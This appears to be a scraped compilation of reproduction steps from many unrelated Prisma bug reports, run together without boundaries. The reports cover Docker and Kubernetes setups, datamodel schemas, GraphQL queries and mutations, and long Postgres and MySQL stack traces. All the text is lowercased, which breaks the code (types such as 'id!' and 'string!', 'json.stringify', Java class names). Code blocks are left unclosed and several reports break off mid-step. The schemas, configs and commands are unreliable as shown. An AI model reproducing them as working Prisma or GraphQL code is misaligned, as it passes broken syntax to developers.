connection terminated unexpectedly at endpointdialog.<anonymous> (/usr/local/lib/node_modules/prisma/node_modules/prisma-cli-core/src/utils/endpointdialog.ts:271:17) at step (/usr/local/lib/node_modules/prisma/node_modules/prisma-cli-core/dist/utils/endpointdialog.js:40:23) at object.throw (/usr/local/lib/node_modules/prisma/node_modules/prisma-cli-core/dist/utils/endpointdialog.js:21:53) at rejected (/usr/local/lib/node_modules/prisma/node_modules/prisma-cli-core/dist/utils/endpointdialog.js:13:65) at <anonymous> at process._tickdomaincallback (internal/process/next_tick.js:228:7)
exiting with code: 1 note that it doesn't prompt me for a schema in my mysql database before crashing
also note that i have validated my mysql server is running locally and is accessable using the credentials shown
i also have looked through the output printed after setting export debug="*" but i didn\'t immediately see anything.
get access to the new container environment (currently invite only)
install prisma
use the cli to login
include in your datamodel.prisma and schema.graphl a type that takes consist of an id and string like so: datamodel.prisma
type permission { id: id! @unique title: string!
``` schema.graphql
type permission { id: id! title: string!
create some entries via mutations in the graphql playground
change the type to use an enum instead of a string for the title like so: datamodel.prisma
type permission { id: id! @unique title: permissionenum!
``` schema.graphql
type permission { id: id! title: permissionenum!
run ``` prisma deploy --force ```
deploy the datamodel
the generated type of multiple field (in this case `todoes`) on query is `promise<array<todonode>>` this type does not extend `fragmentable`
install prisma
setup the config as posted above
execute `prisma generate` ```
generating schema..
syntaxerror: '}' expected
(1478:152) 1476 | */ 1477 | > 1478 | export const prisma = makeprismaclientclass<clientconstructor<prisma>>({typedefs, endpoint: ` {process.env['core_prisma_host']}:4466/core/v${env:core_revision}`}) | ^ 1479 | export const prisma = new prisma()
try db.exists.user, passing a non-existing user id
use following ndf dump: [prisma.zip]( with the following schema: ```
type super_book { id: id! @unique super_book_title: string keywords: string parisian_keyword: string illegality: string bannedby: manuscript_titles_illegal @relation(name: "bannedbook")
} type manuscript_book { id: id! @unique super_book_title: string keywords: string parisian_keyword: string illegality: string
} type manuscript_titles_illegal { id: id! @unique uuid: string! illegal_super_book_code: string! illegal_full_book_title: string! illegal_author_code: string! illegal_author_name: string! illegal_date: string! illegal_folio: string! illegal_notes: string! record_status: string! bastille_book_category: string! bastille_imprint_full: string! bastille_total_volumes: string! bastille_current_volumes: string! bastille_copies_number: string! bans: super_book @relation(name: "bannedbook")
deploy the datamodel
an input type is generated without `connect` ```
input optionaldetailswithoutconnectionupdateoneinput { create: optionaldetailswithoutconnectioncreateinput disconnect: boolean delete: boolean update: optionaldetailswithoutconnectionupdatedatainput upsert: optionaldetailswithoutconnectionupsertnestedinput
deploy the above datamodel
`npm install prisma@beta`
`prisma init abc` -> follow wizard to create new `docker-compose.yml` for local mysql
replace `docker-compose.yml` with ```diff
version: '3'
services: prisma: image: prismagraphql/prisma:1.17-beta restart: always ports: - "4466:4466" environment: prisma_config: | port: 4466 # uncomment the next line and provide the env var prisma_management_api_secret=my-secret to activate cluster security # managementapisecret: my-secret databases: default: connector: mysql host: mysql port: 3307 user: root password: prisma migrations: true rawaccess: true mysql: image: mysql:5.7 restart: always environment: mysql_root_password: prisma ports:
+ - "3307:3306" volumes: - mysql:/var/lib/mysql
volumes: mysql:
- run `docker-compose up -d`
- periodically run `docker ps` and check the status of the prisma container - it'll restart every ~10 seconds and crash: ![image](
run `prisma init --endpoint `
please follow:-
clone
go to [node-graphql](
follow the instructions to setup
run `createdraft` mutation
you will have 2 records returned by the `drafts` query **versions:** - os: `os x high sierra` - `prisma` cli: `prisma/1.17.0-beta.11 (darwin-x64) node-v8.11.3` - prisma server: 1.17-beta-1
deploy this schema
type user { id: id! @unique createdat: datetime! updatedat: datetime! username: string! @unique password: string!
create user from mutation
add more fields to schema
type user { id: id! @unique createdat: datetime! updatedat: datetime! username: string! @unique password: string! post: post
} type post { id: id! @unique createdat: datetime! updatedat: datetime! content: string
now post fields in old user will be null but we want to migrate old data to have post type
mutation { migration_01: updatemanyusers( where: { post: null } data: { post: { create: { content: "hello world" } } } ) { count }
init a prisma instance selecting the docker local installation option with postgresql as database
deploy this datamodel [user, university, career datamodel](
type user { id: id! @unique name: string interestedin: [university!]!
} type university { id: id! @unique name: string careers: [career!]!
} type career { id: id! @unique name: string
load this data [example-data](
try to get all the users, with all the universities they are interested in, but only including the first 10 careers for those universities
query{ users{ name interestedin{ name careers(first: 10){ name } } }
## datamodel.graphql ```graphql
type foo { id: id! @unique bars: [bar!]!
} type bar { id: id! @unique quantity: int!
``` ## query causing `internal server error` ```graphql
mutation { createfoo( data: { bars: { create: [ { quantity: 1 } { quantity: 2 } ] } } ) { id bars(first: 1, orderby: createdat_desc) { quantity } }
``` ## whoops ```graphql
{ "data": { "createfoo": { "id": "cjm0ms9ed01ty0b77x9hudsoc", "bars": null } }, "errors": [ { "message": "whoops
looks like an internal server error
search your server logs for request id: local:api:cjm0ms9e801tw0b77c4bm2ypq", "path": [ "createfoo", "bars" ], "locations": [ { "line": 4, "column": 5 } ], "requestid": "local:api:cjm0ms9e801tw0b77c4bm2ypq" } ]
set up the example:
change a resolver to use `$exists`, for example `query.ts`: ```typescript
export const query: iquery.resolver<types> = { masters: async (root, args, ctx) => { const exists = await ctx.db.$exists.master({ id: "test" }); console.log(exists); return ctx.db.masters(); }
start server, and run the `masters` query.
error: invalid exist query: masters at object.buildexistsinfo (/users/.../prisma-examples/typescript-graphql/node_modules/prisma-client-lib/src/info.ts:289:11)
# prisma.yml
datamodel: datamodel.graphql endpoint: {env:prisma__endpoint__stage}
``` then run generate command, now we have: ```ts
# generated/index.ts
/** * type defs */ export const prisma = makeprismabindingclass<bindingconstructor<prisma>>({ typedefs, endpoint: process.env["prisma__endpoint__stage"],
export const prisma = new prisma();
i prepared a reproduction here:
please read for more information.
in brief: create a short linked list with 4 elements, then delete all elements concurrently
about one time out of 3 or 4, it results in an internal error (cf
cluster log above, deadlock).
create a datamodel: ```
type a { field: int
} type b { field: int a: a!
} type c { field: int a: a
``` the generated type `aupdateone` will have no disconnect field
create a datamodel: ```
type a { field: int
} type b { field: int a: a
} type c { field: int a: a!
``` the generated type `aupdateone` will have a disconnect field.
do not start prisma container
run `prisma deploy --force` and check we get `could not connect to server at...`
check exitcode with `echo $?`..
it is `0` instead of `>=1`
schema: ```
type item @model { id: id! @unique year: int! revisions: [itemrevision!]! @relation(name: "itemrevisions", ondelete: cascade)
} type itemrevision @model { id: id! @unique item: item! @relation(name: "itemrevisions") createdat: datetime! name: string! organization: string! description: string! editreason: string
``` query that triggers the issue:
query { items { id revisions(orderby: createdat_desc, first: 1) { id name organization __typename } __typename }
``` query that works as expected:
query { items { id revisions(orderby: createdat_desc, first: 1) { id name createdat organization __typename } __typename }
type user { id: int! @unique post: post @pgrelation(column: "post_id") book: book @pgrelation(column: "book_id") stats: stats @pgrelation(column: "stats_id")
``` then run this query:
createuser(data: { post: { connect: { id: 1 } } book: { connect: { id: 1 } } stats: { connect: { id: 1 } }
![image 2018-09-07 at 3 26 25 pm](
![image 2018-09-07 at 3 26 51 pm](
run `prisma export` on the source server
run `prisma import` on the destination server
*schema* ```graphql
type deployment { id: id! @unique site: site! @relation(name: "sitedeployments") files: [deploymentartifact!]! @relation(name: "deploymentallfiles") children: [deploymentartifact!]! @relation(name: "deploymentrootchildfiles")
} type deploymentartifact { id: id! @unique children: [deploymentartifact!]! deploy: deployment @relation(name: "deploymentallfiles")
} type auth { id: id! @unique sites: [site!]! @relation(name: "siteauths")
} type site { id: id! @unique deployments: [deployment!]! @relation(name: "sitedeployments", ondelete: cascade) auths: [auth!]! @relation(name: "siteauths")
``` *query - does not work* ```graphql
query { deploymentartifacts (where:{ id:"cjlpdxlg300220803zdenvako", deploy: { site:{ auths_some:{ id:"cjlpdthbs000r0803ut4q22lh" } }, } }) { id }
``` *query - does work* ```graphql
query { deploymentartifacts (where:{ id:"cjlpdxlg300220803zdenvako", deploy: { id: "cjlpdxlcy001w0803w4pi99t6" # <- this is making the query work site:{ auths_some:{ id:"cjlpdthbs000r0803ut4q22lh" } }, } }) { id }
create a new service with the following datamodel: ```
type a { field: int b: b
} type b { field: int a: a c: c @relation(name: "atob")
} type c { field: int b: b @relation(name: "atob")
``` prisma will associate `c.b` with `a` instead of `b`
all input types and output types will be generated according to this incorrect association
attempting to create a node of `c` with an associated node of type `b` leads to an internal server error: ```
mutation test1 { createc(data: { field: 10, b: { create: { field: 15 } } }) { field b { field } }
create a new prisma service with the following datamodel: ```
type a { id: id! @unique c: b
} type b { a: a!
``` this will create an input type `bcreateonewithoutainput`, which is empty and cannot be parsed by `graphql-js`
due to this, the playground will no longer be operational for this service.
> prisma init id-contains-test
> cd id-contains-test
``` deploy to local cluster, running mysql ```
> prisma deploy
``` go to [ and type the following query: ```graphql
query { users(where: {id_contains: "test"}) { id name }
server returns error: ```json
{ "data": null, "errors": [ { "message": "whoops
looks like an internal server error
search your server logs for request id: local:api:cjlnt5nu601mr0934p2xn05bh", "path": [ "users" ], "locations": [ { "line": 2, "column": 3 } ], "requestid": "local:api:cjlnt5nu601mr0934p2xn05bh" } ]
``` **stacktrace** ```
java.lang.runtimeexception: not supported: scalarfilter(scalarfield(id,com.prisma.shared.models.typeidentifier$cuid$@18dac76d,true,false,true,false,false,false,none,none,none,fieldtemplate(id,com.prisma.shared.models.typeidentifier$cuid$@18dac76d,true,false,true,false,false,false,none,none,none,none,none),com.prisma.shared.models.model@2ccf68ca),contains(cuidgcvalue(test))) at scala.sys.package$.error(package.scala:27) at com.prisma.api.connector.jdbc.database.setparams$.setfilter(setparams.scala:86) at com.prisma.api.connector.jdbc.database.setparams$.$anonfun$setfilter$2(setparams.scala:59) at com.prisma.api.connector.jdbc.database.setparams$.$anonfun$setfilter$2$adapted(setparams.scala:59) at scala.collection.iterator.foreach(iterator.scala:929) at scala.collection.iterator.foreach$(iterator.scala:929) at scala.collection.abstractiterator.foreach(iterator.scala:1417) at scala.collection.iterablelike.foreach(iterablelike.scala:71) at scala.collection.iterablelike.foreach$(iterablelike.scala:70) at scala.collection.abstractiterable.foreach(iterable.scala:54) at com.prisma.api.connector.jdbc.database.setparams$.setfilter(setparams.scala:59) at com.prisma.api.connector.jdbc.database.setparams$.$anonfun$setfilter$1(setparams.scala:51) at com.prisma.api.connector.jdbc.database.setparams$.$anonfun$setfilter$1$adapted(setparams.scala:50) at scala.option.foreach(option.scala:257) at com.prisma.api.connector.jdbc.database.setparams$.setfilter(setparams.scala:50) at com.prisma.api.connector.jdbc.database.setparams$.$anonfun$setqueryargs$1(setparams.scala:18) at com.prisma.api.connector.jdbc.database.setparams$.$anonfun$setqueryargs$1$adapted(setparams.scala:17) at scala.option.foreach(option.scala:257) at com.prisma.api.connector.jdbc.database.setparams$.setqueryargs(setparams.scala:17) at com.prisma.api.connector.jdbc.database.nodemanyqueries.$anonfun$getnodes$1(nodemanyqueries.scala:34) at com.prisma.api.connector.jdbc.database.nodemanyqueries.$anonfun$getnodes$1$adapted(nodemanyqueries.scala:34) at com.prisma.api.connector.jdbc.database.builderbase.$anonfun$jooqtodbio$1(builderbase.scala:80) at slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:70) at slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:69) at slick.basic.basicbackend$databasedef$$anon$2.liftedtree1$1(basicbackend.scala:275) at slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:275) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748)
deploy a new prisma service
run `prisma playground`
setup new project (prisma init <project-name>)
deploy to demo server
add bunch of users
mutation { createuser(data: { name: "name1" }) { name }
} mutation { createuser(data: { name: "name2" }) { name }
query with skip params
query { users(where: {}, skip: 1) { name }
this is my model shop -> owner - one to one
owner -> fruit - one to many
fruit -> color - one to one
type shop { id: id! @unique owner: owner
} type owner { id: id! @unique shop: shop favoritefruits: [fruit!]!
} type fruit { id: id! @unique owner: owner color: color
} type color { id: id! @unique fruit: fruit
``` { shops( where: { owner: { favoritefruits_some: { color: { id: "any_id" } } } } ) { id }
set `managementapisecret` in `docker-compose.yml`
set `prisma_management_api_secret` in `.env`
run `docker-compose up -d`
run `prisma login`
run `prisma deploy`
setup prisma 1.14.2 with latest postgresql database 2
schema: ```graphql
type session { id: id! @unique, taskgroups: [taskgroup!]! @relation(name: "taskgroupsforsession", ondelete: cascade)
} type taskgroup { id: id! @unique, session: session! @relation(name: "taskgroupsforsession"), tasks: [task!]! @relation(name: "tasksfortaskgroups", ondelete: cascade)
} type task { id: id! @unique, taskgroup: taskgroup! @relation(name: "tasksfortaskgroups"), template: template @relation(name: "templatefortask", ondelete: cascade)
} type template { id: id! @unique, task: task @relation(name: "templatefortask")
seed with some data 4
query this works: ```graphql
query templates(where: task: { taskgroup: { id: "abc" } }
``` but this doesn't: ```graphql
query templates(where: task: { taskgroup: { session: { id: "xyz" } } }
setup prisma 1.14.2 with latest postgresql database.
create schema: ```graphql
type painting { id: string! @unique, strokes: [stroke!]! @relation(name: "strokesforpainting", ondelete: cascade)
} type stroke { id: string! @unique, painting: painting! @relation(name: "strokesforpainting"), samples: [strokesample!]! @relation(name: "strokesamplesforstroke", ondelete: cascade)
} type strokesample { id: string! @unique, x: float!, y: float!, stroke: stroke! @relation(name: "strokesamplesforstroke")
seed with data
i had 128 strokes each with 256 samples in a painting
try to delete painting -> cascading deletes are performed
everything is alright when number of strokes/samples are quite low (don't know exactly how many are okay)
**error occurred with 128 strokes each with 256 samples (in total 32768 samples).**
1.) `oc cluster up`
2.) `oc new-app --docker-image=prismagraphql/prisma:1.14`
3.) `oc status` will eventually say something like "errors: pod/prisma-whatever is crash-looping"
4.) `oc logs pod/prisma-whatever` shows "/app/start.sh: line 3: ./app/bin/prisma-local: permission denied"
feel free to use my endpoint:
create new service in prisma with the following schema:
type post { id: id! @unique
execute the below in playground against prisma endpoint
fragment postfragment on post{ id
subscription {post{node{ ...postfragment }}}
returns `{ data: null }` straight away + closes the connection (no spinner in playground)
running `https_proxy= prisma login`
start out with this datamodel: ```graphql
type user { id: id! @unique isadmin: boolean
now deploy this datamodel: ```diff
type user { id: id! @unique
- isadmin: boolean
+ isadmin: boolean!
get internal server error, find this in the logs: ```
org.postgresql.util.psqlexception: error: column user.isadmin does not exist hint: perhaps you meant to reference the column "user.isadmin"
position: 68 at org.postgresql.core.v3.queryexecutorimpl.receiveerrorresponse(queryex
ecutorimpl.java:2433) at org.postgresql.core.v3.queryexecutorimpl.processresults(queryexecutor
impl.java:2178) at org.postgresql.core.v3.queryexecutorimpl.execute(queryexecutorimpl.ja
va:306) at org.postgresql.jdbc.pgstatement.executeinternal(pgstatement.java:441)
initialize prisma server from prisma aws fargate template (
load test the server with a significant amount of traffic, including lots of of websocket subscriptions and server-side subscriptions.
go to ecs cluster (name will be what you used during cf stack creation
click on prisma service
click on events tab
observe the number of times that you see the container restart and the downtime between restarts.
1) start with one of the graphql boilerplate templates and edit the datamodel.graphql file to be:
enum userrolesenum { guest verified authenticated
type user { id: id! @unique email: string @unique createdat: datetime! updatedat: datetime! password: string name: string usertype: userrolesenum!
2) run `prisma deploy` 3) get rekt by an error
at first it says internal server error
going to the prisma logs i see the following (running prisma and postgres with docker-compose):
postgres_1 | 2018-08-14 20:27:58.276 utc [29] error: column user.usertype does not exist at character 74
postgres_1 | 2018-08-14 20:27:58.276 utc [29] hint: perhaps you meant to reference the column "user.usertype".
postgres_1 | 2018-08-14 20:27:58.276 utc [29] statement: select exists(select "id" from "postgres$default"."user"
postgres_1 | where "postgres$default"."user".usertype is null)
prisma_1 | org.postgresql.util.psqlexception: error: column user.usertype does not exist
prisma_1 | hint: perhaps you meant to reference the column "user.usertype".
prisma_1 | position: 74
prisma_1 | at org.postgresql.core.v3.queryexecutorimpl.receiveerrorresponse(queryexecutorimpl.java:2433)
prisma_1 | at org.postgresql.core.v3.queryexecutorimpl.processresults(queryexecutorimpl.java:2178)
prisma_1 | at org.postgresql.core.v3.queryexecutorimpl.execute(queryexecutorimpl.java:306)
prisma_1 | at org.postgresql.jdbc.pgstatement.executeinternal(pgstatement.java:441)
prisma_1 | at org.postgresql.jdbc.pgstatement.execute(pgstatement.java:365)
prisma_1 | at org.postgresql.jdbc.pgpreparedstatement.executewithflags(pgpreparedstatement.java:155)
prisma_1 | at org.postgresql.jdbc.pgpreparedstatement.execute(pgpreparedstatement.java:144)
prisma_1 | at com.zaxxer.hikari.pool.proxypreparedstatement.execute(proxypreparedstatement.java:44)
prisma_1 | at com.zaxxer.hikari.pool.hikariproxypreparedstatement.execute(hikariproxypreparedstatement.java)
prisma_1 | at slick.jdbc.statementinvoker.results(statementinvoker.scala:38)
prisma_1 | at slick.jdbc.statementinvoker.iteratorto(statementinvoker.scala:21)
prisma_1 | at slick.jdbc.invoker.foreach(invoker.scala:47)
prisma_1 | at slick.jdbc.invoker.foreach$(invoker.scala:46)
prisma_1 | at slick.jdbc.statementinvoker.foreach(statementinvoker.scala:15)
prisma_1 | at slick.jdbc.streaminginvokeraction.run(streaminginvokeraction.scala:22)
prisma_1 | at slick.jdbc.streaminginvokeraction.run$(streaminginvokeraction.scala:20)
prisma_1 | at slick.jdbc.sqlactionbuilder$$anon$1.run(staticquery.scala:95)
prisma_1 | at slick.jdbc.sqlactionbuilder$$anon$1.run(staticquery.scala:95)
prisma_1 | at slick.basic.basicbackend$databasedef$$anon$2.liftedtree1$1(basicbackend.scala:275)
prisma_1 | at slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:275)
prisma_1 | at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)
prisma_1 | at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)
prisma_1 | at java.lang.thread.run(thread.java:748)
``` 4) remove the exclamation mark from userrolesenum and watch the code magically work again when running `prisma deploy`
apply the following kubernetes resource
attach to the logs ```
apiversion: apps/v1beta1
kind: deployment
metadata: name: postgres
spec: replicas: 1 template: metadata: labels: name: postgres spec: containers: - name: postgres image: postgres:9.2-alpine imagepullpolicy: ifnotpresent env: - name: postgres_password value: password - name: postgres_user value: user - name: postgres_db value: database
# volumemounts:
# - mountpath: /var/lib/postgresql/data
# name: postgres-data
# - name: postgres-data
# hostpath:
# path: /data/postgres-data-development
apiversion: v1
kind: service
metadata: name: postgres
spec: selector: name: postgres ports: - name: postgres protocol: tcp port: 5432 targetport: 5432 nodeport: 30001 type: nodeport
apiversion: v1
kind: configmap
metadata: name: prisma
data: prisma_config: | port: 4466 databases: default: connector: postgres host: postgres port: 5432 user: user password: password database: database migrations: true
apiversion: extensions/v1beta1
kind: deployment
metadata: name: prisma
spec: template: metadata: labels: name: prisma spec: containers: - name: prisma image: 'prismagraphql/prisma:1.12' ports: - name: prisma containerport: 4466 env: - name: prisma_config valuefrom: configmapkeyref: name: prisma key: prisma_config
apiversion: v1
kind: service
metadata: name: prisma
spec: ports: - port: 4466 targetport: 4466 protocol: tcp selector: name: prisma
`git clone `
`cd dailyq-api && git checkout development && yarn install && yarn start` to make this example work, you need to provide variables `development_prisma_endpoint`(url to prisma endpoint), `development_prisma_secret`(any string) and `development_app_secret`(any string) in `.env` and then run `prisma deploy`.
create subscription with datetime previousvalues definition.
docker compose with prisma 1.13 docker image.
docker-compose up -d
docker-compose logs server is starting with 9000 port
graphql playground is reachable on 9000 but not the server.
use the `prisma init` wizard to connect to an existing postgres db and inspect the generated `docker-compose.yml`.
do a `prisma init` and set up a new mysql instance as normal.
in the generated `datamodel.graphql`, change the default `id` field declaration to `uuid! @unique`.
run `prisma migrate` to deploy the schema.
run `prisma playground` and attempt to use a mutation query to create a new user.
deploy this datamodel: ```graphql
type role { id: id! @unique name: string! systemrole: systemrole! userroles: [userrole!]! @relation(name: "roleuserroles", ondelete: cascade)
} type userrole { id: id! @unique user: user! @relation(name: "useruserroles") role: role! @relation(name: "roleuserroles")
} type user { id: id! @unique email: string! @unique userroles: [userrole!]! @relation(name: "useruserroles", ondelete: cascade)
} type organisation { id: id! @unique name: string! roles(organisationid: string!): [role!]! @relation(name: "organisationroles", ondelete: cascade)
} enum systemrole { client client_manager admin concierge
run this query: ```graphql
query { organisations( where: { roles_some: { userroles_some: { user: { id_contains: "cjg0z0pw9bz9m0b269lev8vy9" } } } } ) { id }
you'll get an internal server error
in logs: ```
{ "key": "error/unhandled", "requestid": "eu1:api:cjkmcofnw06oz0b30257qr6yw", "clientid": "nilan-marktanner-7ea852~r-unknown-columm@dev", "payload": { "exception": "java.sql.sqlsyntaxerrorexception: (conn=760153) unknown column \'role_alias.id\' in \'in/all/any subquery\'", "query": "{\ organisations(where: {roles_some: {userroles_some: {user: {id: \\"cjg0z0pw9bz9m0b269lev8vy9\\"}}}}) {\ id\ }\ }\ ", "variables": "{}", "code": "0", "stack_trace": "org.mariadb.jdbc.internal.util.exceptions.exceptionmapper.get(exceptionmapper.java:163)\\\ org.mariadb.jdbc.internal.util.exceptions.exceptionmapper.getexception(exceptionmapper.java:106)\\\ org.mariadb.jdbc.mariadbstatement.executeexceptionepilogue(mariadbstatement.java:235)\\\ org.mariadb.jdbc.mariadbpreparedstatementclient.executeinternal(mariadbpreparedstatementclient.java:224)\\\ org.mariadb.jdbc.mariadbpreparedstatementclient.execute(mariadbpreparedstatementclient.java:159)\\\ org.mariadb.jdbc.mariadbpreparedstatementclient.executequery(mariadbpreparedstatementclient.java:173)\\\ com.zaxxer.hikari.pool.proxypreparedstatement.executequery(proxypreparedstatement.java:52)\\\ com.zaxxer.hikari.pool.hikariproxypreparedstatement.executequery(hikariproxypreparedstatement.java)\\\ com.prisma.api.connector.jdbc.database.builderbase.$anonfun$querytodbio$1(builderbase.scala:57)\\\ com.prisma.api.connector.jdbc.database.builderbase.$anonfun$jooqtodbio$1(builderbase.scala:87)\\\ slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:70)\\\ slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:69)\\\ slick.basic.basicbackend$databasedef$$anon$2.liftedtree1$1(basicbackend.scala:275)\\\ slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:275)\\\ java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)\\\ java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)\\\ java.lang.thread.run(thread.java:748)", "message": "(conn=760153) unknown column \'role_alias.id\' in \'in/all/any subquery\'" }
deploy this datamodel: ```
type user { id: id! @unique name: string!
create a few user nodes: ```
mutation a { createuser(data: { name: "test" }) { id }
count paginated users ```
query c { usersconnection(first: 3) { aggregate { count } }
see that count is not `3` but as many users as you created: ```
{ "data": { "usersconnection": { "aggregate": { "count": 4 } } }
create prisma server using the "create server" flow in app.prisma.sh`
create your prod env file
try to deploy to this server and you will receive an error
connect two nodes that are already connected, using nested `connect`.
create and deploy type ```
type y { id: uuid! @unique value: int
create a few nodes of type `y`
{ "data": { "ies": [ { "id": "26247034-a0c6-4b30-861d-504bc59ddf54", "value": 3 }, { "id": "41c597fe-2c78-4af6-bd8f-ab8107e90898", "value": 5 }, { "id": "6bc1691c-fa91-49fa-982d-c7fd53fa59d3", "value": 1 }, { "id": "eb1743e9-d0a5-4123-8142-50fb33ac89bc", "value": 4 }, { "id": "f7290046-e962-488e-9c32-cc60b943a990", "value": 2 } ] }
create query (e.g
in playground)::
query gety($after: string, $before: string, $first: int, $orderby: yorderbyinput) { ies(after: $after, before: $before, first: $first, orderby: $orderby) { id value }
send `gety` with variables:
{ "first": 1
results as expected:
{ "data": { "ies": [ { "id": "26247034-a0c6-4b30-861d-504bc59ddf54", "value": 3 } ] }
send `gety` with variables:
{ "first": 1, "after": "26247034-a0c6-4b30-861d-504bc59ddf54"
results in error ```
{ "data": null, "errors": [ { "message": "whoops
looks like an internal server error
search your server logs for request id: local:api:cjkk6bqnu002c08297fgixhit", "path": [ "ies" ], "locations": [ { "line": 2, "column": 3 } ], "requestid": "local:api:cjkk6bqnu002c08297fgixhit" } ]
send `gety` with variables:
{ "first": 1, "before": "eb1743e9-d0a5-4123-8142-50fb33ac89bc"
results in the same error as in 5.
follow the steps in the [prisma docs]( example to set a prisma `secret`, then generate a `__token__` using `prisma token`.
client-side, use `window.fetch` to access the server
be sure to include `authorization: bearer __token__` in the header.
```javascript
window.fetch(__server_url__, { headers: { authorization: 'bearer __token__' }, method: 'post', mode: 'cors', body: json.stringify({ query: __api__, variables })
run the code, so that the token gets sent to the server and you get a response.
re-run the code, but this time without the `authorization: 'bearer __token__'`:
```javascript
window.fetch(__server_url__, { method: 'post', mode: 'cors', body: json.stringify({ query: __api__, variables })
deploy this datamodel: ```graphql
type user { id: id! @unique test: test @relation(name: "test", ondelete: cascade)
initialize & deploy a new prisma project
create at least 32768 users
issue a query of the form:
deletemanyusers { count
this will produce this error and not delete the records.
subscribe to `deleted` and be sure to query `previousvalues` with the `id` field: ```graphql
subscription { user { previousvalues { id } }
delete an entry to trigger subscription.
1) create files `prisma init` selecting existing postgresql database during `prisma init` creates prisma.yml, datamodel.graphql and docker-compose.yml
prisma.yml:
endpoint:
datamodel: datamodel.graphql
datamodel.graphql:
type manager_keyword @pgtable(name: "manager_keyword") { id: int! @unique geo: string keyword: string
docker-compose.yml: ```
version: '3'
services: prisma: image: prismagraphql/prisma:1.14 restart: always ports: - "4466:4466" environment: prisma_config: | port: 4466 databases: default: connector: postgres host: ***.rds.amazonaws.com port: \'5432\' database: *** schema: public user: *** password: *** migrations: false
``` 2) deploy `docker-compose up` (`-d` option omitted to view logs) in another terminal, `prisma deploy` 3) query executing this query in graphql playground (localhost:4466)
{ manager_keywords { id geo keyword }
gives this result:
{ "data": { "manager_keywords": [ { "id": 1, "geo": "de", "keyword": "kw1" }, { "id": 2, "geo": "uk", "keyword": "kw2" } ] }
which is expected and matches the result from psql:
select * from manager_keyword; id | keyword | geo
----+---------+----- 1 | kw1 | de 2 | kw2 | uk
this shows that prisma is able to read from the `public` schema of postgresql
4) error during mutations executing the create mutation
mutation { createmanager_keyword(data: { geo: "fr", keyword: "kw3" }) { id geo keyword }
results in this error in graphql playground:
{ "data": null, "errors": [ { "message": "whoops
looks like an internal server error
search your server logs for request id: local:api:cjkb3vjy3000b0856unkcajlv", "path": [ "createmanager_keyword" ], "locations": [ { "line": 2, "column": 3 } ], "requestid": "local:api:cjkb3vjy3000b0856unkcajlv" } ]
and a corresponding error from postgresql in docker-compose up:
prisma_1 | {"key":"error/unhandled","requestid":"local:api:cjkb3vjy3000b0856unkcajlv","clientid":"default$default","payload":{"exception":"org.postgresql.util.psqlexception: error: relation \\"default$default.manager_keyword\\" does not exist\ position: 13","query":"mutation {\ createmanager_keyword(data: {geo: \\"uk\\", keyword: \\"kw3\\"}) {\ id\ geo\ keyword\ }\ }\ ","variables":"{}","code":"0","stack_trace":"org.postgresql.core.v3.queryexecutorimpl.receiveerrorresponse(queryexecutorimpl.java:2433)\\\ org.postgresql.core.v3.queryexecutorimpl.processresults(queryexecutorimpl.java:2178)\\\ org.postgresql.core.v3.queryexecutorimpl.execute(queryexecutorimpl.java:306)\\\ org.postgresql.jdbc.pgstatement.executeinternal(pgstatement.java:441)\\\ org.postgresql.jdbc.pgstatement.execute(pgstatement.java:365)\\\ org.postgresql.jdbc.pgpreparedstatement.executewithflags(pgpreparedstatement.java:155)\\\ org.postgresql.jdbc.pgpreparedstatement.execute(pgpreparedstatement.java:144)\\\ com.zaxxer.hikari.pool.proxypreparedstatement.execute(proxypreparedstatement.java:44)\\\ com.zaxxer.hikari.pool.hikariproxypreparedstatement.execute(hikariproxypreparedstatement.java)\\\ com.prisma.api.connector.jdbc.database.builderbase.$anonfun$insertreturninggeneratedkeystodbio$1(builderbase.scala:64)\\\ com.prisma.api.connector.jdbc.database.builderbase.$anonfun$jooqtodbio$1(builderbase.scala:87)\\\ slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:70)\\\ slick.jdbc.simplejdbcaction.run(streaminginvokeraction.scala:69)\\\ slick.basic.basicbackend$databasedef$$anon$2.liftedtree1$1(basicbackend.scala:275)\\\ slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:275)\\\ java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)\\\ java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)\\\ java.lang.thread.run(thread.java:748)","message":"error: relation \\"default$default.manager_keyword\\" does not exist\ position: 13"}}
prisma_1 | [bugsnag - local / testing] error report: com.bugsnag.report@89ae9a8
prisma_1 | org.postgresql.util.psqlexception: error: relation "default$default.manager_keyword" does not exist
this error is thrown during update and delete mutations too
it seems that prisma looks for the table in `default$default` schema during mutations and `public` schema during queries.
run `yarn start`
it is reproduced in the [snapshot]( #l81) of the tests for introspection.
create prisma project by running docker run -v `pwd`:/usr/src/app -it node:latest /bin/bash -c "npm install prisma -g; prisma init hello-world; cp -a /hello-world/
/usr/src/app" 2
select create new database 3
select postgres 4
run docker-compose up -d 5
docker ps 6
docker container constantly restarts
create a new project `prisma init subscriptions` 1
demo server (also tried `create new database` with local postgres) 2
hosted on eu-west-1 (also tried us-west-2)
`cd subscriptions; prisma deploy`
open playground
start the subscription
perform the mutation subscription: ```
subscription s { user { mutation node { id name } }
``` mutation: ```
mutation m { createuser(data: {name: "dale cooper"}) { id name }
this is my schema
type user { id: id! @unique follower: [user!]! @relation(name: "userfollow") following: [user!]! @relation(name: "userfollow")
first connect x/y and x/z ```graphql
mutation { updateuser(data:{ following: { connect: [{ id: "y" }, { id: "z"}] } },where:{ id:"x" }) { id }
``` then disconnect x/y ```graphql
mutation { updateuser(data:{ follower: { disconnect: [{ id: "x" }] } },where:{ id:"y" }) { id }
``` this is what is got from mysql log
